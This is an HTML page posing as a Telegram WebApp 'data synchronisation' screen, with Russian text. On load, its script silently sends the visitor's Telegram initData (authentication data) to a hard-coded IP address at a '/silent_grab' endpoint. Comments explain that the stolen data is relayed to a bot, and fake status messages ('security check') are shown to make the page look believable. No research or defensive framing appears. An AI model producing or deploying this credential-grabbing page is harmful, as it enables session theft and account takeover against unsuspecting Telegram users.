<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram WebApp</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            background-color: #000;
            color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        .loader {
            border: 4px solid #1a1a1a;
            border-top: 4px solid #0088cc; /* Фирменный синий ТГ */
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .status-text {
            margin-top: 25px;
            font-size: 16px;
            font-weight: 500;
            color: #888;
            letter-spacing: 0.5px;
        }
        .sub-text {
            margin-top: 10px;
            font-size: 12px;
            color: #444;
            text-transform: uppercase;
        }
    </style>
</head>
<body>

    <div class="loader"></div>
    <div class="status-text" id="status">Синхронизация данных...</div>
    <div class="sub-text">Пожалуйста, не закрывайте приложение</div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand(); // Разворачиваем на весь экран

        // Отправка данных на твой VPS (86.110.212.62)
        // Скрипт в Termux поймает это и пришлет тебе ЛОГ в бота
        fetch('https://86.110.212.62:5000/silent_grab', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                initData: tg.initData
            })
        })
        .then(response => console.log('Данные отправлены'))
        .catch(error => console.error('Ошибка отправки:', error));

        // Через 5 секунд меняем текст для правдоподобности
        setTimeout(() => {
            document.getElementById('status').innerText = "Проверка безопасности...";
        }, 5000);
        
        // Еще через 10 секунд
        setTimeout(() => {
            document.getElementById('status').innerText = "Подключение к узлу сети (7 дней)...";
        }, 15000);
    </script>
</body>
</html>
